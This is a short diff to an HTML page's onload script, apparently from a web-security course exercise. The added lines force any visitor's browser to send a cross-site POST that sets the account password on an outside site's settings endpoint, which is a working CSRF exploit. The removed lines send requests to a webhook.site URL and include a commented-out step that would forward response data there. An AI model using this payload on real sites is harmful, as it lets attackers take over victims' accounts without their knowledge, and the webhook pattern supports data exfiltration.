@@ -7,15 +7,9 @@
     <script>
         window.onload = function() {
             var xhr = new XMLHttpRequest();
-            xhr.open("GET", "https://webhook.site/65d06db1-3fc0-4e77-954d-3d0380378094?QWERTY", true);
-            // xhr.onload = function() {
-            //     // Send the response body to your webhook site
-            //     // var sendData = xhr.responseText;
-            //     var sendReq = new XMLHttpRequest();
-            //     sendReq.open("POST", "https://webhook.site/65d06db1-3fc0-4e77-954d-3d0380378094?QWERTY", true);
-            //     sendReq.send();
-            // };
-            xhr.send();
+            xhr.open("POST", "https://cats.is-course.ru/settings?", true);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.send('password=123&confirm-password=123');
         }
     </script>
 </head>
